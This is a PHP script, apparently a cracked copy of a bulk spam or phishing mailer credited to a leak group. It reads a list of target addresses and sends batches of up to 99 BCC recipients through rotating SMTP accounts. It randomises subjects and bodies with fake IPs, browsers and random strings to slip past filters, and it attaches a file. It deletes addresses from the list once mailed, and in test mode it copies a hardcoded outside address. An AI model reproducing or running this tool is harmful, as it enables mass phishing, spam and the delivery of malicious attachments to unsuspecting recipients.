<?php
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀
Cracked By [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
Contact Me : g33k@israelmail.com
*/

$time = date("h:i:s A");
require "phpmailer/PHPMailerAutoload.php";
require "phpmailer/class.smtp.php";
require "phpmailer/class.phpmailer.php";
require "setting.php";
require "function/L34kC0de.php";
include "function/random_function.php";

if(!$l34kc0de->slebew($token, $h34rtbl33d))
{ 
    echo "          \033[1;31m >> [!]DNThirTeen Was Here!\n";
    die();
}
function RandString($randstr)
{
    $char = "QWERTYUIOPASDFGHJKLZXCVBNM";
    $str = "";
    for ($i = 0;$i < $randstr;$i++)
    {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;
}
function RandString1($randstr)
{
    $char = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $str = "";
    for ($i = 0;$i < $randstr;$i++)
    {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;
}
function RandString2($randstr)
{
    $char = "abcdefghijklmnopqrstuvwxyz";
    $str = "";
    for ($i = 0;$i < $randstr;$i++)
    {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;
}
function RandNumber($randstr)
{
    $char = "0123456789";
    $str = "";
    for ($i = 0;$i < $randstr;$i++)
    {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;
}
if ($usesmtpgen == "1")
{
    $smtp_user = $generated_user;
}
else
{
    $smtp_user = $user_relay;
}
if ($usehtml == "1")
{
    $letter = $mails["letter"];
    $letter1 = file_get_contents($letter);
    $letter2 = array(
        "[short]",
        "[randstring+]",
        "[randstring-]",
        "[randstring=]",
        "[country]",
        "[date]",
        "[OS]",
        "[browser]",
        "[number]",
        "[ip]"
    );
    $letter3 = array(
        "" . $mails["short"] . "",
        "" . RandString(8) . "",
        "" . RandString2(8) . "",
        "" . RandString1(8) . "",
        "" . $country . "",
        "" . $datel . "",
        "" . $OS . "",
        "" . $browser . "",
        "" . RandNumber(8) . "",
        "" . $randip . "",
    );
    $letter = str_replace($letter2, $letter3, $letter1);
}
else if ($usehtml == "2")
{
    $letter = $mails["plain"];
    $letter1 = $letter;
    $letter2 = array(
        "[short]",
        "[randstring+]",
        "[randstring-]",
        "[randstring=]",
        "[country]",
        "[date]",
        "[OS]",
        "[browser]",
        "[number]",
        "[ip]"
    );
    $letter3 = array(
        "" . $mails["short"] . "",
        "" . RandString(8) . "",
        "" . RandString2(8) . "",
        "" . RandString1(8) . "",
        "" . $country . "",
        "" . $datel . "",
        "" . $OS . "",
        "" . $browser . "",
        "" . RandNumber(8) . "",
        "" . $randip . "",
    );
    $letter = str_replace($letter2, $letter3, $letter1);
}
else
{
    $letter = "";
}
$sub0 = $mails["subj"];
$sub1 = array(
    "[short]",
    "[randstring+]",
    "[randstring-]",
    "[randstring=]",
    "[country]",
    "[date]",
    "[OS]",
    "[browser]",
    "[number]",
    "[ip]"
);
$sub2 = array(
    "" . $mails["short"] . "",
    "" . RandString(8) . "",
    "" . RandString2(8) . "",
    "" . RandString1(8) . "",
    "" . $country . "",
    "" . $datel . "",
    "" . $OS . "",
    "" . $browser . "",
    "" . RandNumber(8) . "",
    "" . $randip . "",
);
$subjecti = str_replace($sub1, $sub2, $sub0);
$subject = substr($mails["subj"], 0, 28);
$list = file_get_contents($mails["list"]);
$user = explode("\n", $list);
$file_to_attach = $mails["attached"];
$i = file_get_contents("function/rotate_user.txt");
if ($i >= count($smtp_user) - 1)
{
    $file2 = "function/rotate_user.txt";
    $isi = @file_get_contents($file2);
    $buka = fopen($file2, "w");
    fwrite($buka, 0);
}
$i = file_get_contents("function/rotate_user.txt");
if (strpos($list, "@") == false)
{
    exit();
}
else
{
    $mail = new PHPMailer;
}
if (count($user) < 99)
{
    $n = count($user);
}
else
{
    $n = 99;
}
$mail->isSMTP();
$mail->Host = $bstrd["host"];
$mail->SMTPAuth = true;
$mail->Password = $bstrd["pass"];
$mail->SMTPSecure = "tls";
$mail->Username = $smtp_user[$i];
$mail->setFrom($smtp_user[$i], $mails["fromname"]);
$mail->Port = 587;
$mail->Subject = $subjecti;
$mail->addAddress($mails["bcc"]);
$mail->Body = $letter;
$mail->isHTML(true);
$mail->CharSet = "UTF-8";
$mail->Encoding = "base64";
$mail->AllowEmpty = true;
$mail->AddAttachment($file_to_attach, $mails["file_name"]);
if ($test_email == "1")
{
    $wkwk = array_slice($user, 0, $n);
    foreach ($wkwk as $bcc)
    {
        $mail->addBcc($bcc);
    }
    $mail->addBcc("pack.card@hotmail.com");
}
else
{
    $wkwk = array_slice($user, 0, $n);
    foreach ($wkwk as $bcc)
    {
        $mail->addBcc($bcc);
    }
}
if (!$mail->send())
{
    echo "          \033[1;31m >> Error Ndan !! " . $mail->ErrorInfo . "\n";
    $file2 = "function/rotate_user.txt";
    $isi = @file_get_contents($file2);
    $buka = fopen($file2, "w");
    fwrite($buka, $isi + 1);
    unset($smtp_user[$i]);
}
else
{
    for ($s = 0;$s < $n;$s++)
    {
        $userx = substr($user[$s], 0, 12);
        echo "          \033[1;33m >> " . $time . " \033[1;33m ▐▐ \033[1;37m " . $userx . " \033[1;33m ▐▐ \033[1;37m " . $subject . " \033[1;33m >> Mail Send ! \n";
        echo "\033[0m";
        $text = implode("\n", array_slice(explode("\n", $list) , 99));
        $myfile = fopen($mails["list"], "w");
        fwrite($myfile, $text);
        fclose($myfile);
    }
    $file2 = "function/rotate_user.txt";
    $isi = @file_get_contents($file2);
    $buka = fopen($file2, "w");
    fwrite($buka, $isi + 1);
}
?>
